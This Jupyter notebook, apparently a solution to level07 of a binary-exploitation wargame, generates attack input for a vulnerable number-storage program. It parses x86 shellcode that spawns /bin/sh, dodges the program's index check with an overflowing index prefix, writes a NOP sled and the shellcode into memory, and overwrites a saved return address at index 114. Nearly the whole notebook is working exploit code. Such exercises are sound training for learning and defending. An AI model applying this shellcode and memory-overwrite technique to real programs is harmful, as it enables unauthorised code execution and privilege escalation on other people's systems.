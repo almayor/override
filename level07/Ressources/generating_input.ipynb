{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "b86127a5",
   "metadata": {},
   "source": [
    "### Parsing shellcode\n",
    "\n",
    "We're using [this shellcode](https://shell-storm.org/shellcode/files/shellcode-863.php)."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 80,
   "id": "d18ae538",
   "metadata": {},
   "outputs": [],
   "source": [
    "shellcode = \"\"\"\n",
    "\\\\xeb \\\\x25 \\\\x5e \\\\x89\n",
    "\\\\xf7 \\\\x31 \\\\xc0 \\\\x50\n",
    "\\\\x89 \\\\xe2 \\\\x50 \\\\x83\n",
    "\\\\xc4 \\\\x03 \\\\x8d \\\\x76\n",
    "\\\\x04 \\\\x33 \\\\x06 \\\\x50\n",
    "\\\\x31 \\\\xc0 \\\\x33 \\\\x07\n",
    "\\\\x50 \\\\x89 \\\\xe3 \\\\x31\n",
    "\\\\xc0 \\\\x50 \\\\x8d \\\\x3b\n",
    "\\\\x57 \\\\x89 \\\\xe1 \\\\xb0\n",
    "\\\\x0b \\\\xcd \\\\x80 \\\\xe8\n",
    "\\\\xd6 \\\\xff \\\\xff \\\\xff\n",
    "\\\\x2f \\\\x2f \\\\x62 \\\\x69\n",
    "\\\\x6e \\\\x2f \\\\x73 \\\\x68\n",
    "\"\"\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 81,
   "id": "616d26f1",
   "metadata": {},
   "outputs": [],
   "source": [
    "def get_uint(line):\n",
    "    hexbytes = line.strip().split()\n",
    "    hexbytes = [v[2:] for v in hexbytes]\n",
    "    hexvalue = '0x' + ''.join(reversed(hexbytes))\n",
    "    return eval(hexvalue)\n",
    "\n",
    "\n",
    "shlcode_lines = shellcode.strip().split('\\n')\n",
    "shlcode_values = list(map(get_uint, shlcode_lines))"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "1a9a7854",
   "metadata": {},
   "source": [
    "### Initializing Command Writer"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 82,
   "id": "91cc4c34",
   "metadata": {},
   "outputs": [],
   "source": [
    "class CmdWriter:\n",
    "\n",
    "    # we avoiding using multiples of 3 as indices\n",
    "    prefix = 0b01000000000000000000000000000000\n",
    "\n",
    "    def __init__(self):\n",
    "        self.idx = 0\n",
    "        self.lines = []\n",
    "    \n",
    "    def store(self, value, idx=None):\n",
    "        if idx is None:\n",
    "            idx = self.idx\n",
    "            self.idx += 1\n",
    "        \n",
    "        self.lines.append('store')\n",
    "        self.lines.append(f'{value}')\n",
    "        self.lines.append(f'{self._get_idx(idx)}')\n",
    "    \n",
    "    def read(self, idx):\n",
    "        self.lines.append('read')\n",
    "        self.lines.append(f'{idx}')\n",
    "    \n",
    "    def quit(self):\n",
    "        self.lines.append('quit')\n",
    "    \n",
    "    def __repr__(self):\n",
    "        return '\\n'.join(self.lines) + '\\n'\n",
    "    \n",
    "    def _get_idx(self, idx):\n",
    "        return idx if idx % 3 else self.prefix + idx\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 83,
   "id": "d243b550",
   "metadata": {},
   "outputs": [],
   "source": [
    "writer = CmdWriter()"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "c27d4918",
   "metadata": {},
   "source": [
    "### Writing injection"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "4fe06710",
   "metadata": {},
   "source": [
    "Adding NOP instructions"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 84,
   "id": "a55a6923",
   "metadata": {},
   "outputs": [],
   "source": [
    "n_nop = 200\n",
    "for i in range(n_nop // 4):\n",
    "    writer.store(0x90909090)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "48ec7b83",
   "metadata": {},
   "source": [
    "Writing shellcode"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 85,
   "id": "9ef5402e",
   "metadata": {},
   "outputs": [],
   "source": [
    "for value in shlcode_values:\n",
    "    writer.store(value)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "2789aeba",
   "metadata": {},
   "source": [
    "Then we need to overwrite location at idx 114 and store `0xffffd544 + 50`, where we're leaving 50 bytes of slack to account for the stack shift when running code inside and outside `gdb`. We've added a NOP slide, so the precise location doesn't matter."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 86,
   "id": "47468326",
   "metadata": {},
   "outputs": [],
   "source": [
    "writer.store(0xffffd544 + 50, 114)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "f5707910",
   "metadata": {},
   "source": [
    "Testing values by reading and quitting"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 87,
   "id": "cc6e3c73",
   "metadata": {},
   "outputs": [],
   "source": [
    "writer.read(0)\n",
    "writer.read(114)\n",
    "writer.quit()"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "5a83a0f7",
   "metadata": {},
   "source": [
    "### Writing output"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 88,
   "id": "be33399d",
   "metadata": {},
   "outputs": [],
   "source": [
    "with open('input.txt', 'w') as f:\n",
    "    f.write(str(writer))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "72fef999",
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3.9.13 64-bit",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.9.13"
  },
  "toc": {
   "base_numbering": 1,
   "nav_menu": {},
   "number_sections": true,
   "sideBar": true,
   "skip_h1_title": false,
   "title_cell": "Table of Contents",
   "title_sidebar": "Contents",
   "toc_cell": false,
   "toc_position": {},
   "toc_section_display": true,
   "toc_window_display": false
  },
  "vscode": {
   "interpreter": {
    "hash": "aee8b7b246df8f9039afb4144a1f6fd8d2ca17a180786b69acc140d282b71a49"
   }
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
